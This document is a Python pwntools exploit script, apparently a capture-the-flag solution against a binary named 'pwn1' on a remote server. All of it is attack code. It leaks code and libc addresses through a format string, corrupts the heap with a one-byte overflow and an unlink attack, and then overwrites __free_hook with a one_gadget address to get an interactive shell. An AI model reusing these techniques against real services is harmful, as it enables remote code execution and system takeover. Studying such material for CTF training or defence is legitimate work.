#!//usr/bin/python
#-*- coding:utf-8-*-
from pwn import *
context.binary = ELF("./pwn1")
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	gdb.attach(p, 'b* 0x1186')
	raw_input()

def menu(ch):
	p.sendlineafter('>>', str(ch))

def add(idx, size, content):
	menu(1)

	p.sendlineafter('(0-10):', str(idx))
	p.sendlineafter('size', str(size))
	p.sendlineafter('content', content)
	print "add a chunk!"

def free(idx):
	menu(2)
	p.sendlineafter('index', str(idx))


def edit(idx, content):
	menu(4)
	p.sendlineafter('index', str(idx))
	p.sendlineafter('content', content)
	print "edit %d chunk !" % idx

def leak():
	leak_fmt = '%11$p%15$p'
	p.sendlineafter('name:', leak_fmt)
	p.recvuntil('Hello, ')
	code_base = int(p.recv(14), 16) - 0x1186
	libc_start_main = int(p.recv(14), 16) - 240
	libc_base = libc_start_main - libc.symbols['__libc_start_main']
	print "libc_start_main ==> ", hex(libc_start_main)
	print "libc_base ==> ", hex(libc_base)
	print "code_base ==> ", hex(code_base)
	return (code_base, libc_base)
def exploit():
	lk = leak()
	code_base = lk[0]
	libc_base = lk[1]

	#one byte over
	#unlink
	header = code_base + 0x202060
	add(0, 0xf8, 'a')
	add(1, 0xf8, 'b')
	add(2, 0x88, '/bin/sh\x00')
	add(3, 0x88, 'a')
	payload = p64(0) + p64(0xf0) + p64(header - 0x18) + p64(header - 0x10)
	payload = payload.ljust(0xf0, 'a')
	payload += p64(0xf0) + '\x00'
	edit(0, payload)
	free(1)

	#cove pointer
	gadgets = [0xf1147, 0xf02a4, 0x4526a, 0x45216]
	__free_hook = libc_base + libc.symbols['__free_hook']
	system = libc_base + libc.symbols['system']
	edit(0, 'a'*0x18 + p64(header-0x18) + p64(0x108) + p64(__free_hook) + p64(0x108))
	edit(1, p64(gadgets[2]+libc_base))
	#dbg()
	free(2)

	
	p.interactive()
	p.close()


if __name__ == '__main__':
	#p = process("./pwn1")
	p = remote('47.108.135.45', 20092)
	exploit()